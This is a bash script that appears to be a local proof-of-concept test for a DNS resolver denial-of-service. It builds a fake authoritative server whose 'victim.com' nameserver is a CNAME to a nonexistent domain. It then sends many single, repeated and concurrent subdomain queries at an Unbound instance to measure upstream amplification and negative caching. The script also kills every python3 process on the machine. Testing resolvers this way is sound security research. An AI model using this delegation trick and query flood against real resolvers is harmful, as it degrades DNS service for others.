#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════
#  NS→CNAME→NXDOMAIN DoS Test — Simplified
# ═══════════════════════════════════════════════════════════════════
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq > /dev/null 2>&1
apt-get install -y -qq dnsutils python3 bc > /dev/null 2>&1

VDIR="/workspace/output/cname-nxdos-test"
mkdir -p "$VDIR"
UNBOUND="/workspace/output/unbound-binary-baseline"

pkill -f python3 2>/dev/null || true
pkill -f "unbound.*5353" 2>/dev/null || true
sleep 1

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  NS→CNAME→NXDOMAIN DoS Test                                ║"
echo "╚══════════════════════════════════════════════════════════════╝"

# ═══ Single auth on 127.0.0.2:53 — handles everything ═══
cat > "$VDIR/auth.py" << 'PYEOF'
#!/usr/bin/env python3
import socket, struct, time, json, sys

LOG = "/workspace/output/cname-nxdos-test/auth.jsonl"

def enc(n):
    if not n or n == '.': return b'\x00'
    r = b''
    for l in n.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode()
    return r + b'\x00'

def rr(n, t, c, ttl, d):
    return enc(n) + struct.pack('!HHI', t, c, ttl) + struct.pack('!H', len(d)) + d

def log(q, t, f, r):
    with open(LOG, 'a') as fh: fh.write(json.dumps({'q':q,'t':t,'f':f,'r':r,'ts':time.monotonic()})+'\n')
    print(f"[AUTH] {f}: {q} {t} → {r}", flush=True)

SOA_V = enc('ns.victim.com.')+enc('admin.victim.com.')+struct.pack('!IIIII',2026100901,3600,900,604800,86400)
SOA_S = enc('ns.safe.com.')+enc('admin.safe.com.')+struct.pack('!IIIII',2026100902,3600,900,604800,86400)
SOA_X = enc('ns1.xyz.')+enc('admin.xyz.')+struct.pack('!IIIII',2026100905,3600,900,604800,86400)

QTM = {1:'A',2:'NS',5:'CNAME',6:'SOA',28:'AAAA'}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.2', 53))
sock.settimeout(0.5)
print("[AUTH] 127.0.0.2:53 listening", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        if len(data)<12: continue
        txid,fl,qd=struct.unpack('!HHH',data[:6])
        if fl>>15: continue
        off=12; lab=[]
        while off<len(data) and data[off]!=0:
            ll=data[off]
            if ll==0 or off+1+ll>len(data): break
            if ll>63: off+=2; break
            lab.append(data[off+1:off+ll].decode('ascii',errors='replace'))
            off+=1+ll
        else: off+=1
        qn='.'.join(lab)
        if off+4>len(data): continue
        qt,qc=struct.unpack('!HH',data[off:off+4])
        qtn=QTM.get(qt,f'T{qt}')
        qnl=qn.lower().rstrip('.')

        # Root
        if qnl=='' and qt in (2,6):
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,2)
            r+=enc('.')+struct.pack('!HH',qt,qc)
            if qt==2:
                r+=rr('.',2,qc,86400,enc('ns1.'))
                r+=rr('com.',2,qc,86400,enc('ns1.com.'))
                r+=rr('ns1.',1,qc,86400,struct.pack('!I',0x7f000002))
                r+=rr('ns1.com.',1,qc,86400,struct.pack('!I',0x7f000002))
            else:
                r+=rr('.',6,qc,86400,enc('ns1.')+enc('admin.')+struct.pack('!IIIII',2026100900,3600,900,604800,86400))
            log(qn,qtn,addr[0],'ROOT'); sock.sendto(r,addr); continue
        if qnl=='ns1' and qt==1:
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('ns1.')+struct.pack('!HH',1,qc)
            r+=rr('ns1.',1,qc,86400,struct.pack('!I',0x7f000002))
            log(qn,qtn,addr[0],'ROOT_A'); sock.sendto(r,addr); continue

        # com TLD
        if qnl=='com' and qt in (2,6):
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,1)
            r+=enc('com.')+struct.pack('!HH',qt,qc)
            if qt==2:
                r+=rr('com.',2,qc,86400,enc('ns1.com.'))
                r+=rr('ns1.com.',1,qc,86400,struct.pack('!I',0x7f000002))
            else:
                r+=rr('com.',6,qc,86400,enc('ns1.com.')+enc('admin.com.')+struct.pack('!IIIII',2026100904,3600,900,604800,86400))
            log(qn,qtn,addr[0],'COM'); sock.sendto(r,addr); continue
        if qnl=='ns1.com' and qt==1:
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('ns1.com.')+struct.pack('!HH',1,qc)
            r+=rr('ns1.com.',1,qc,86400,struct.pack('!I',0x7f000002))
            log(qn,qtn,addr[0],'COM_A'); sock.sendto(r,addr); continue

        # xyz TLD
        if qnl=='xyz' and qt in (2,6):
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,1)
            r+=enc('xyz.')+struct.pack('!HH',qt,qc)
            if qt==2:
                r+=rr('xyz.',2,qc,86400,enc('ns1.xyz.'))
                r+=rr('ns1.xyz.',1,qc,86400,struct.pack('!I',0x7f000002))
            else:
                r+=rr('xyz.',6,qc,86400,SOA_X)
            log(qn,qtn,addr[0],'XYZ'); sock.sendto(r,addr); continue
        if qnl=='ns1.xyz' and qt==1:
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('ns1.xyz.')+struct.pack('!HH',1,qc)
            r+=rr('ns1.xyz.',1,qc,86400,struct.pack('!I',0x7f000002))
            log(qn,qtn,addr[0],'XYZ_A'); sock.sendto(r,addr); continue

        # deadzone.xyz → NXDOMAIN (domain does not exist)
        if qnl=='deadzone.xyz' or qnl.endswith('.deadzone.xyz'):
            r=struct.pack('!HHHHHH',txid,0x8003,1,0,1,0)
            r+=enc(qn)+struct.pack('!HH',qt,qc)
            r+=rr('xyz.',6,qc,300,SOA_X)
            log(qn,qtn,addr[0],'NXDOMAIN_deadzone'); sock.sendto(r,addr); continue

        # safe.com (control — normal NS→A)
        if qnl=='safe.com' and qt in (2,6):
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('safe.com.')+struct.pack('!HH',qt,qc)
            if qt==2: r+=rr('safe.com.',2,qc,300,enc('ns.safe.com.'))
            else: r+=rr('safe.com.',6,qc,300,SOA_S)
            log(qn,qtn,addr[0],'SAFE_ZONE'); sock.sendto(r,addr); continue
        if qnl=='ns.safe.com' and qt==1:
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('ns.safe.com.')+struct.pack('!HH',1,qc)
            r+=rr('ns.safe.com.',1,qc,300,struct.pack('!I',0x7f000002))
            log(qn,qtn,addr[0],'SAFE_A'); sock.sendto(r,addr); continue
        if qnl=='www.safe.com' and qt==1:
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('www.safe.com.')+struct.pack('!HH',1,qc)
            r+=rr('www.safe.com.',1,qc,300,struct.pack('!I',0x05050505))
            log(qn,qtn,addr[0],'SAFE_WWW'); sock.sendto(r,addr); continue

        # victim.com zone
        if qnl=='victim.com' and qt in (2,6):
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('victim.com.')+struct.pack('!HH',qt,qc)
            if qt==2: r+=rr('victim.com.',2,qc,300,enc('ns.victim.com.'))
            else: r+=rr('victim.com.',6,qc,300,SOA_V)
            log(qn,qtn,addr[0],'VICTIM_ZONE'); sock.sendto(r,addr); continue

        # KEY: ns.victim.com → CNAME → nonexistent.deadzone.xyz
        if qnl=='ns.victim.com' and qt in (1,5,28):
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('ns.victim.com.')+struct.pack('!HH',qt,qc)
            r+=rr('ns.victim.com.',5,qc,300,enc('nonexistent.deadzone.xyz.'))
            log(qn,qtn,addr[0],'CNAME→NX'); sock.sendto(r,addr); continue

        # com→victim.com referral
        if qnl=='victim.com' or qnl.endswith('.victim.com'):
            r=struct.pack('!HHHHHH',txid,0x8000,1,0,1,1)
            r+=enc(qn)+struct.pack('!HH',qt,qc)
            r+=rr('victim.com.',2,qc,300,enc('ns.victim.com.'))
            r+=rr('ns.victim.com.',5,qc,300,enc('nonexistent.deadzone.xyz.'))
            log(qn,qtn,addr[0],'REF→victim'); sock.sendto(r,addr); continue

        # com→safe.com referral
        if qnl=='safe.com' or qnl.endswith('.safe.com'):
            r=struct.pack('!HHHHHH',txid,0x8000,1,0,1,1)
            r+=enc(qn)+struct.pack('!HH',qt,qc)
            r+=rr('safe.com.',2,qc,300,enc('ns.safe.com.'))
            r+=rr('ns.safe.com.',1,qc,300,struct.pack('!I',0x7f000002))
            log(qn,qtn,addr[0],'REF→safe'); sock.sendto(r,addr); continue

        # Default NXDOMAIN
        r=struct.pack('!HHHHHH',txid,0x8003,1,0,0,0)+enc(qn)+struct.pack('!HH',qt,qc)
        log(qn,qtn,addr[0],'NXDOMAIN'); sock.sendto(r,addr)
    except socket.timeout:
        continue
    except Exception as e:
        print(f"[AUTH] Err: {e}", file=sys.stderr)
PYEOF

# Start auth
> "$VDIR/auth.jsonl"
python3 "$VDIR/auth.py" > "$VDIR/auth.log" 2>&1 &
sleep 1
echo "  Auth server started"

# ═══ Unbound ═══
cat > "$VDIR/hint" << 'EOF'
. IN NS ns1.
ns1. IN A 127.0.0.2
EOF

cat > "$VDIR/ub.conf" << 'CONF'
server:
    directory: "/workspace/output/cname-nxdos-test"
    pidfile: "/workspace/output/cname-nxdos-test/unbound.pid"
    port: 5353
    interface: 127.0.0.1@5353
    do-ip6: no
    access-control: 127.0.0.0/8 allow
    username: ""
    chroot: ""
    do-daemonize: no
    use-syslog: no
    logfile: "/workspace/output/cname-nxdos-test/unbound.log"
    verbosity: 3
    log-queries: yes
    log-replies: yes
    do-not-query-localhost: no
    root-hints: "/workspace/output/cname-nxdos-test/hint"
    domain-insecure: "."
    domain-insecure: "com"
    domain-insecure: "victim.com"
    domain-insecure: "safe.com"
    domain-insecure: "xyz"
    domain-insecure: "deadzone.xyz"
    harden-glue: no
    harden-dnssec-stripped: no
    val-permissive-mode: yes
    prefetch: no
    qname-minimisation: no

stub-zone:
    name: "com"
    stub-addr: 127.0.0.2@53

stub-zone:
    name: "xyz"
    stub-addr: 127.0.0.2@53

remote-control:
    control-enable: no
CONF

"$UNBOUND" -c "$VDIR/ub.conf" -d > "$VDIR/ub_stdout.log" 2>&1 &
UB_PID=$!
sleep 3
if ! kill -0 $UB_PID 2>/dev/null; then echo "Unbound FAILED"; cat "$VDIR/unbound.log"|head -20; exit 1; fi
echo "  Unbound started"

# ═══ TEST 1: Single query → count upstream ═══
echo ""
echo "═══ TEST 1: Single query → upstream query count ═══"
> "$VDIR/auth.jsonl"
echo "  Query: www.victim.com A (NS→CNAME→NXDOMAIN)..."
dig @127.0.0.1 -p 5353 www.victim.com A +time=15 +tries=1 2>&1 | tee "$VDIR/dig1.txt"
sleep 2
Q1=$(wc -l < "$VDIR/auth.jsonl" 2>/dev/null || echo 0)
echo "  Upstream queries: $Q1"
cat "$VDIR/auth.jsonl" | python3 -c "
import sys,json
for l in sys.stdin:
    if l.strip():
        q=json.loads(l)
        print(f'    {q[\"q\"]:<40} {q[\"t\"]:<8} → {q[\"r\"]}')" 2>/dev/null || true

# ═══ TEST 2: Repeat query — failure cache? ═══
echo ""
echo "═══ TEST 2: Repeat query — failure cache? ═══"
> "$VDIR/auth.jsonl"
echo "  Same query again..."
dig @127.0.0.1 -p 5353 www.victim.com A +time=5 +tries=1 2>&1 | tee "$VDIR/dig2.txt"
sleep 1
Q2=$(wc -l < "$VDIR/auth.jsonl" 2>/dev/null || echo 0)
echo "  Upstream queries: $Q2  (0 = cached, >0 = not cached)"

# ═══ TEST 3: Different subdomain — delegation failure cached? ═══
echo ""
echo "═══ TEST 3: Different subdomain (mail.victim.com) ═══"
> "$VDIR/auth.jsonl"
echo "  Query: mail.victim.com A..."
dig @127.0.0.1 -p 5353 mail.victim.com A +time=15 +tries=1 2>&1 | tee "$VDIR/dig3.txt"
sleep 2
Q3=$(wc -l < "$VDIR/auth.jsonl" 2>/dev/null || echo 0)
echo "  Upstream queries: $Q3  (0 = delegation failure cached, >0 = NOT cached → DoS risk!)"

# ═══ TEST 4: 20 different subdomains ═══
echo ""
echo "═══ TEST 4: 20 different subdomains ═══"
> "$VDIR/auth.jsonl"
echo "  Querying sub01..sub20.victim.com..."
for i in $(seq 1 20); do
    dig @127.0.0.1 -p 5353 "sub$(printf '%02d' $i).victim.com" A +time=10 +tries=1 > /dev/null 2>&1
done
sleep 2
Q4=$(wc -l < "$VDIR/auth.jsonl" 2>/dev/null || echo 0)
echo "  20 subdomains → Total upstream: $Q4 (avg $(echo "scale=1; $Q4/20" | bc)/query)"

# ═══ TEST 5: Normal domain during stress ═══
echo ""
echo "═══ TEST 5: Normal resolution (safe.com) during stress ═══"
echo "  Baseline: www.safe.com..."
dig @127.0.0.1 -p 5353 www.safe.com A +time=5 2>&1 | grep -E "status|www.safe|ANSWER" | head -3

echo ""
echo "  Launching 50 concurrent broken queries..."
for i in $(seq 1 50); do
    dig @127.0.0.1 -p 5353 "stress$(printf '%03d' $i).victim.com" A +time=5 +tries=1 > /dev/null 2>&1 &
done
sleep 0.3
echo "  Testing www.safe.com DURING stress..."
dig @127.0.0.1 -p 5353 www.safe.com A +time=10 2>&1 | grep -E "status|www.safe|ANSWER" | head -3
wait
sleep 1

# ═══ Unbound log analysis ═══
echo ""
echo "═══ UNBOUND LOG ═══"
echo "  CNAME/deadzone resolution:"
grep -iE "cname|deadzone|nonexistent" "$VDIR/unbound.log" 2>/dev/null | head -20 || true
echo ""
echo "  SERVFAIL/errors:"
grep -iE "servfail|fail|out_of_range|no_target|error" "$VDIR/unbound.log" 2>/dev/null | head -10 || true

# ═══ SUMMARY ═══
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  SUMMARY                                                    ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "  T1: Single query upstream       = $Q1"
echo "  T2: Repeat query upstream       = $Q2"
echo "  T3: Different subdomain upstream= $Q3"
echo "  T4: 20 subdomains total upstream= $Q4 (avg $(echo "scale=1; $Q4/20" | bc)/query)"
echo ""

if [ "$Q2" -eq 0 ] 2>/dev/null && [ "$Q3" -eq 0 ] 2>/dev/null; then
    echo "  ╔══════════════════════════════════════════════════════════════╗"
    echo "  ║  VERDICT: NOT a DoS vulnerability                         ║"
    echo "  ║  Failure IS cached. Same/different subdomain hits cache.   ║"
    echo "  ╚══════════════════════════════════════════════════════════════╝"
elif [ "$Q3" -gt 0 ] 2>/dev/null; then
    echo "  ╔══════════════════════════════════════════════════════════════╗"
    echo "  ║  VERDICT: DoS AMPLIFICATION RISK                           ║"
    echo "  ║  Each new subdomain re-triggers upstream → amplifiable!    ║"
    echo "  ╚══════════════════════════════════════════════════════════════╝"
elif [ "$Q2" -gt 0 ] 2>/dev/null; then
    echo "  ╔══════════════════════════════════════════════════════════════╗"
    echo "  ║  VERDICT: FAILURE CACHE MISSING                            ║"
    echo "  ║  Same query re-triggers upstream → no negative caching     ║"
    echo "  ╚══════════════════════════════════════════════════════════════╝"
fi

kill $UB_PID 2>/dev/null || true
pkill -f python3 2>/dev/null || true
echo ""
echo "=== Complete ==="
